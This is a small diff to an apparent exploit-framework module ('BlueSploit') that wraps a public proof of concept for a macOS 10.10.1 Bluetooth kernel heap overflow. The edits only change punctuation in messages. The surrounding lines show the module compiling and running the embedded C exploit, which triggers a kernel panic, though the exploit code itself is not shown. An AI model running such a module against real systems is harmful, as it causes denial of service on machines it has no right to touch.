@@ -1,6 +1,6 @@
 """
 BlueSploit Module: macOS DispatchHCIWriteStoredLinkKey Heap Overflow
-EDB-ID: 35774  (Yosemite 10.10.1 — @rpaleari & @joystick)
+EDB-ID: 35774  (Yosemite 10.10.1, @rpaleari & @joystick)
 
 Original C PoC embedded verbatim; compiled and run at module execution time.
 """
@@ -126,9 +126,9 @@ class Module(DosModule):
             print_error("macOS only")
             return False
         if not find_compiler():
-            print_error("No C compiler — install Xcode Command Line Tools")
+            print_error("No C compiler, install Xcode Command Line Tools")
             return False
-        print_warning("Heap overflow — kernel panic on unpatched 10.10.1")
+        print_warning("Heap overflow, kernel panic on unpatched 10.10.1")
 
         rc, out, err = compile_and_run(
             C_SOURCE, "iobt_writestoredlinkkey",
